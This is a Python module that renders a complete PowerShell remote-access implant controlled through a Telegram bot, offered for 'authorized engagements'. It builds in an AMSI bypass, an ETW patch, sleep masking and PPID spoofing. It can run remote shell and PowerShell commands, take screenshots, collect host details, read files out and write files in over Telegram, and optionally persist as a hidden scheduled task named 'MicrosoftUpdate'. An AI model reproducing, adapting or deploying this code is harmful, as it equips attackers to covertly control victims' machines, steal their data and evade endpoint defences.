"""
Full PowerShell Telegram stager — polls getUpdates and executes received tasks.

This is a self-contained PS1 implant intended for lab / authorized engagements.
It does NOT require the C binary; it is entirely PowerShell.

Includes:
  - Hardware breakpoint AMSI bypass (VEH + SetThreadContext, no VirtualProtect for AMSI)
  - ETW patch (single VirtualProtect on ntdll!EtwEventWrite)
  - NtDelayExecution sleep masking (avoids Sleep API hooks)
  - PPID spoofing via CreateProcessWithParent (PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)
"""
from __future__ import annotations
import base64


# ── AMSI bypass: hardware breakpoint via VEH + SetThreadContext ────────────────
# No VirtualProtect call for AMSI — entirely in-memory, lower EDR surface.

_AMSI_HW_BYPASS_CS = r"""
using System;
using System.Runtime.InteropServices;

public class AmsiHWBP {
    [DllImport("k"+"ernel32")] static extern IntPtr LoadLibrary(string n);
    [DllImport("k"+"ernel32")] static extern IntPtr GetProcAddress(IntPtr m, string n);
    [DllImport("k"+"ernel32")] static extern IntPtr GetCurrentThread();
    [DllImport("k"+"ernel32")] static extern bool GetThreadContext(IntPtr t, ref CONTEXT c);
    [DllImport("k"+"ernel32")] static extern bool SetThreadContext(IntPtr t, ref CONTEXT c);
    [DllImport("k"+"ernel32")] static extern IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15;
        public ulong Rip;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst=512)]
        public byte[] FltSave;
        public ulong VectorRegister0, VectorRegister1;
        public ulong DebugControl, LastBranchToRip, LastBranchFromRip;
        public ulong LastExceptionToRip, LastExceptionFromRip;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct EXCEPTION_POINTERS {
        public IntPtr ExceptionRecord;
        public IntPtr ContextRecord;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct EXCEPTION_RECORD {
        public uint ExceptionCode;
        public uint ExceptionFlags;
        public IntPtr ExceptionRecord2;
        public IntPtr ExceptionAddress;
        public uint NumberParameters;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst=15)]
        public ulong[] ExceptionInformation;
    }

    const uint CONTEXT_DEBUG_REGISTERS = 0x00010010;
    const uint EXCEPTION_SINGLE_STEP   = 0x80000004;
    const int  EXCEPTION_CONTINUE_EXECUTION = -1;
    const int  EXCEPTION_CONTINUE_SEARCH    =  0;
    // AMSI_RESULT_CLEAN maps to S_OK (0) in the scan result register
    const ulong AMSI_RESULT_CLEAN_RAX = 0x80070057UL;

    static IntPtr _amsiScanBufferAddr = IntPtr.Zero;

    static int VehHandler(IntPtr pExInfo) {
        if (_amsiScanBufferAddr == IntPtr.Zero) return EXCEPTION_CONTINUE_SEARCH;
        var ep = (EXCEPTION_POINTERS)Marshal.PtrToStructure(pExInfo, typeof(EXCEPTION_POINTERS));
        var er = (EXCEPTION_RECORD)Marshal.PtrToStructure(ep.ExceptionRecord, typeof(EXCEPTION_RECORD));
        if (er.ExceptionCode != EXCEPTION_SINGLE_STEP) return EXCEPTION_CONTINUE_SEARCH;
        var ctx = (CONTEXT)Marshal.PtrToStructure(ep.ContextRecord, typeof(CONTEXT));
        if (ctx.Rip != (ulong)(long)_amsiScanBufferAddr) return EXCEPTION_CONTINUE_SEARCH;
        // Set return value = AMSI_RESULT_CLEAN, clear DR0 hardware breakpoint
        ctx.Rax = AMSI_RESULT_CLEAN_RAX;
        ctx.Dr0 = 0;
        ctx.Dr7 = ctx.Dr7 & ~(ulong)0x3;
        Marshal.StructureToPtr(ctx, ep.ContextRecord, true);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    public static void Install() {
        try {
            var lib = LoadLibrary("am" + "si.dll");
            if (lib == IntPtr.Zero) return;
            _amsiScanBufferAddr = GetProcAddress(lib, "Am" + "siScanBuffer");
            if (_amsiScanBufferAddr == IntPtr.Zero) return;

            // Register VEH
            var del     = new Func<IntPtr,int>(VehHandler);
            var fp      = Marshal.GetFunctionPointerForDelegate(del);
            AddVectoredExceptionHandler(1, fp);

            // Set DR0 = AmsiScanBuffer, enable local execute breakpoint via DR7
            var hThread = GetCurrentThread();
            var ctx     = new CONTEXT();
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            ctx.FltSave      = new byte[512];
            GetThreadContext(hThread, ref ctx);
            ctx.Dr0 = (ulong)(long)_amsiScanBufferAddr;
            ctx.Dr7 = (ctx.Dr7 & ~(ulong)0xFFFF) | 0x1;   // local enable DR0 on execute
            SetThreadContext(hThread, ref ctx);
        } catch {}
    }
}
"""

_AMSI_BYPASS = (
    "$_amsiCs = @\"\n"
    + _AMSI_HW_BYPASS_CS
    + "\n\"@\n"
    "try { Add-Type -TypeDefinition $_amsiCs -EA Stop } catch {}\n"
    "try { [AmsiHWBP]::Install() } catch {}\n"
)


# ── ETW patch ─────────────────────────────────────────────────────────────────

_ETW_BYPASS = r"""
try {
  $_etw_cs = @"
using System; using System.Runtime.InteropServices;
public class EtwPatch {
  [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr m, string n);
  [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
  [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint op);
}
"@
  Add-Type -TypeDefinition $_etw_cs -EA Stop
  $ntdll = [EtwPatch]::LoadLibrary("ntdll.dll")
  $fn    = [EtwPatch]::GetProcAddress($ntdll, "EtwEventWrite")
  $op    = [uint]0
  [EtwPatch]::VirtualProtect($fn, [UIntPtr]4, 0x40, [ref]$op) | Out-Null
  [Runtime.InteropServices.Marshal]::Copy([byte[]](0x33,0xC0,0xC3), 0, $fn, 3)
  [EtwPatch]::VirtualProtect($fn, [UIntPtr]4, $op, [ref]$op) | Out-Null
} catch {}
"""


# ── NtDelayExecution sleep masking ────────────────────────────────────────────

_SLEEP_MASK_CS = r"""
using System; using System.Runtime.InteropServices;
public class SleepMask {
  [DllImport("ntdll")] static extern int NtDelayExecution(bool alertable, ref long interval);
  public static void SleepMs(long ms) {
    long interval = -(ms * 10000L);
    NtDelayExecution(false, ref interval);
  }
}
"""

_SLEEP_MASK = (
    "$_sleepCs = @\"\n"
    + _SLEEP_MASK_CS
    + "\n\"@\n"
    "try { Add-Type -TypeDefinition $_sleepCs -EA Stop } catch {}\n"
    "function _sleep($ms) { try { [SleepMask]::SleepMs($ms) } catch { Start-Sleep -Milliseconds $ms } }\n"
)


# ── PPID spoofing via CreateProcessWithParent ─────────────────────────────────

_PROC_SPOOF_CS = r"""
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class ProcSpoof {
    const uint PROCESS_CREATE_PROCESS = 0x0080;
    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint CREATE_SUSPENDED = 0x00000004;
    const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    struct STARTUPINFOEX {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    struct STARTUPINFO {
        public int    cb;
        public string lpReserved, lpDesktop, lpTitle;
        public int    dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute;
        public int    dwFlags;
        public short  wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }

    [DllImport("kernel32")] static extern IntPtr OpenProcess(uint dwAccess, bool bInherit, int pid);
    [DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32", CharSet=CharSet.Unicode)]
    static extern bool CreateProcess(
        string lpApp, string lpCmd, IntPtr pPA, IntPtr tPA, bool bInherit,
        uint dwFlags, IntPtr lpEnv, string lpDir,
        ref STARTUPINFOEX si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32")] static extern bool InitializeProcThreadAttributeList(
        IntPtr list, int count, int flags, ref IntPtr size);
    [DllImport("kernel32")] static extern bool UpdateProcThreadAttribute(
        IntPtr list, uint flags, IntPtr attr, IntPtr val, IntPtr size, IntPtr prev, IntPtr retSize);
    [DllImport("kernel32")] static extern void DeleteProcThreadAttributeList(IntPtr list);

    public static int CreateProcessWithParent(string parentName, string cmdline) {
        int parentPid = -1;
        foreach (var p in Process.GetProcessesByName(parentName)) {
            parentPid = p.Id; break;
        }
        if (parentPid < 0) return -1;

        IntPtr hParent = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION, false, parentPid);
        if (hParent == IntPtr.Zero) return -1;

        IntPtr listSize = IntPtr.Zero;
        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref listSize);
        IntPtr attrList = Marshal.AllocHGlobal(listSize);
        try {
            InitializeProcThreadAttributeList(attrList, 1, 0, ref listSize);
            IntPtr hParentRef = hParent;
            IntPtr pParent = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(pParent, hParentRef);
            UpdateProcThreadAttribute(attrList, 0,
                (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                pParent, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

            var si = new STARTUPINFOEX();
            si.StartupInfo.cb = Marshal.SizeOf<STARTUPINFOEX>();
            si.lpAttributeList = attrList;
            PROCESS_INFORMATION pi;
            bool ok = CreateProcess(null, cmdline, IntPtr.Zero, IntPtr.Zero,
                false, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                IntPtr.Zero, null, ref si, out pi);
            DeleteProcThreadAttributeList(attrList);
            Marshal.FreeHGlobal(pParent);
            if (!ok) return -1;
            CloseHandle(pi.hThread);
            return pi.dwProcessId;
        } finally {
            Marshal.FreeHGlobal(attrList);
            CloseHandle(hParent);
        }
    }
}
"""

_PROC_SPOOF = (
    "$_spCs = @\"\n"
    + _PROC_SPOOF_CS
    + "\n\"@\n"
    "try { Add-Type -TypeDefinition $_spCs -EA Stop } catch {}\n"
)


_SCREENSHOT_FUNC = r"""
function _ss {
  try {
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing -EA Stop
    $sc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bm = New-Object System.Drawing.Bitmap($sc.Width,$sc.Height)
    $gr = [System.Drawing.Graphics]::FromImage($bm)
    $gr.CopyFromScreen($sc.Location, [System.Drawing.Point]::Empty, $sc.Size)
    $ms = New-Object System.IO.MemoryStream
    $bm.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
    [Convert]::ToBase64String($ms.ToArray())
  } catch { "ERR:$_" }
}
"""

_SYSINFO_FUNC = r"""
function _si {
  $o=@{}
  $o.hostname  = $env:COMPUTERNAME
  $o.username  = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
  $o.os        = (Get-CimInstance Win32_OperatingSystem).Caption
  $o.arch      = $env:PROCESSOR_ARCHITECTURE
  $o.pid       = $PID
  $o.is_admin  = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
  $o.ps_ver    = $PSVersionTable.PSVersion.ToString()
  $o.domain    = (Get-CimInstance Win32_ComputerSystem).Domain
  $o | ConvertTo-Json -Compress
}
"""


def render(
    bot_token: str,
    chat_id: str,
    agent_id: str,
    sleep: int = 10,
    jitter: int = 20,
    persist: bool = False,
    obfuscate: bool = False,
) -> str:
    """Return the full PS1 stager source as a string."""

    persist_block = ""
    if persist:
        persist_block = (
            "\n$_pe = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($_pp));"
            "try { Register-ScheduledTask -TaskName 'MicrosoftUpdate' "
            "-Action (New-ScheduledTaskAction -Execute 'powershell.exe' "
            "-Argument \"-nop -w hidden -EncodedCommand $_pe\") "
            "-Trigger (New-ScheduledTaskTrigger -AtLogOn) "
            "-Principal (New-ScheduledTaskPrincipal -LogonType Interactive) "
            "-Settings (New-ScheduledTaskSettingsSet -Hidden) -Force | Out-Null"
            "} catch {}\n"
        )

    # Build _exec using PPID spoof — spawns under explorer.exe
    # Falls back to direct Process if ProcSpoof fails
    exec_func = r"""
function _exec($cmd) {
  try {
    $pid2 = [ProcSpoof]::CreateProcessWithParent("explorer", "cmd.exe /c $cmd")
    if ($pid2 -gt 0) {
      $p = Get-Process -Id $pid2 -EA SilentlyContinue
      if ($p) { $p.WaitForExit(30000) | Out-Null }
      return "[spawned pid=$pid2]"
    }
  } catch {}
  # fallback: direct process
  try {
    $p = New-Object System.Diagnostics.Process
    $p.StartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $p.StartInfo.FileName = 'cmd.exe'
    $p.StartInfo.Arguments = "/c $cmd"
    $p.StartInfo.UseShellExecute = $false
    $p.StartInfo.RedirectStandardOutput = $true
    $p.StartInfo.RedirectStandardError  = $true
    $p.StartInfo.CreateNoWindow = $true
    $p.Start() | Out-Null
    $out = $p.StandardOutput.ReadToEnd()
    $err = $p.StandardError.ReadToEnd()
    $p.WaitForExit()
    if ($out) { $out } else { $err }
  } catch { "ERROR: $_" }
}
"""

    ps_func = r"""
function _ps($code) {
  try {
    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))
    $pid2 = [ProcSpoof]::CreateProcessWithParent("explorer", "powershell.exe -nop -NonInteractive -EncodedCommand $enc")
    if ($pid2 -gt 0) { return "[ps spawned pid=$pid2]" }
  } catch {}
  # fallback
  try {
    $enc2 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))
    _exec "powershell -nop -NonInteractive -EncodedCommand $enc2"
  } catch { "ERROR: $_" }
}
"""

    # Build sleep jitter block using NtDelayExecution
    sleep_block = (
        "$_jv  = [int]($_slp * $_jit / 100)\n"
        "$_slpMs = ($_slp + (Get-Random -Minimum (-$_jv) -Maximum $_jv)) * 1000\n"
        "if ($_slpMs -lt 1000) { $_slpMs = 1000 }\n"
        "_sleep $_slpMs\n"
    )

    script = (
        "# Fitnah PS1 stager -- authorized use only\n"
        "Set-StrictMode -Off\n"
        "$ErrorActionPreference = 'SilentlyContinue'\n"
        + _AMSI_BYPASS
        + _ETW_BYPASS
        + _SLEEP_MASK
        + _PROC_SPOOF
        + _SCREENSHOT_FUNC
        + _SYSINFO_FUNC
        + exec_func
        + ps_func
        + persist_block
        + "\n"
        + "$_tok = '" + bot_token + "'\n"
        + "$_cid = '" + chat_id + "'\n"
        + "$_aid = '" + agent_id + "'\n"
        + "$_slp = " + str(sleep) + "\n"
        + "$_jit = " + str(jitter) + "\n"
        + "$_off = 0\n"
        + "$_pp  = $MyInvocation.MyCommand.Path\n"
        + "$_wc  = New-Object System.Net.WebClient\n"
        + "$_wc.Headers.Add('Content-Type','application/json')\n"
        + "$_wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy\n"
        + "$_wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials\n"
        + "\n"
        + "function _api($method, $body) {\n"
        + "  try {\n"
        + "    $url = 'https://api.telegram.org/bot' + $_tok + '/' + $method\n"
        + "    if ($body) { return $_wc.UploadString($url, $body) }\n"
        + "    return $_wc.DownloadString($url)\n"
        + "  } catch { return '' }\n"
        + "}\n"
        + "\n"
        + "function _send($text) {\n"
        + "  $b = @{ chat_id=$_cid; text='[' + $_aid + '] ' + $text; parse_mode='HTML' } | ConvertTo-Json -Compress\n"
        + "  _api 'sendMessage' $b | Out-Null\n"
        + "}\n"
        + "\n"
        + "function _handle($task_id, $cmd, $args_json) {\n"
        + "  $a = try { $args_json | ConvertFrom-Json } catch { @{} }\n"
        + "  $out = switch ($cmd) {\n"
        + "    'shell'      { _exec ($a.cmd) }\n"
        + "    'ps'         { _ps   ($a.cmd) }\n"
        + "    'screenshot' { _ss }\n"
        + "    'sysinfo'    { _si }\n"
        + "    'die'        { _send '[!] Dying'; if ($_pp -and (Test-Path $_pp)) { Remove-Item $_pp -Force -EA SilentlyContinue }; exit 0 }\n"
        + "    'download'   {\n"
        + "      try {\n"
        + "        $bytes = [IO.File]::ReadAllBytes($a.path)\n"
        + "        [Convert]::ToBase64String($bytes)\n"
        + "      } catch { 'ERROR: ' + $_ }\n"
        + "    }\n"
        + "    'upload'     {\n"
        + "      try {\n"
        + "        $bytes = [Convert]::FromBase64String($a.data)\n"
        + "        [IO.File]::WriteAllBytes($a.path, $bytes)\n"
        + "        'uploaded ' + $a.path\n"
        + "      } catch { 'ERROR: ' + $_ }\n"
        + "    }\n"
        + "    'checkin'    { _si }\n"
        + "    default      { 'unknown command: ' + $cmd }\n"
        + "  }\n"
        + "  $resp = @{ task_id=$task_id; agent_id=$_aid; status='ok'; output=[string]$out } | ConvertTo-Json -Compress\n"
        + "  $b = @{ chat_id=$_cid; text='RESULT:' + $resp; parse_mode='' } | ConvertTo-Json -Compress\n"
        + "  _api 'sendMessage' $b | Out-Null\n"
        + "}\n"
        + "\n"
        + "# checkin\n"
        + "_send ('CHECKIN:' + (_si))\n"
        + "\n"
        + "while ($true) {\n"
        + "  try {\n"
        + "    $url  = 'https://api.telegram.org/bot' + $_tok + '/getUpdates?offset=' + $_off + '&timeout=30&allowed_updates=[%22message%22]'\n"
        + "    $resp = $_wc.DownloadString($url)\n"
        + "    $json = $resp | ConvertFrom-Json\n"
        + "    foreach ($u in $json.result) {\n"
        + "      $_off = $u.update_id + 1\n"
        + "      $txt  = $u.message.text\n"
        + "      if ($txt -match '^TASK:') {\n"
        + "        $payload = $txt.Substring(5) | ConvertFrom-Json\n"
        + "        if ($payload.agent_id -eq $_aid -or $payload.agent_id -eq '*') {\n"
        + "          _handle $payload.task_id $payload.command ($payload.args | ConvertTo-Json -Compress)\n"
        + "        }\n"
        + "      }\n"
        + "    }\n"
        + "  } catch {}\n"
        + "  " + sleep_block
        + "}\n"
    )
    return script.strip()
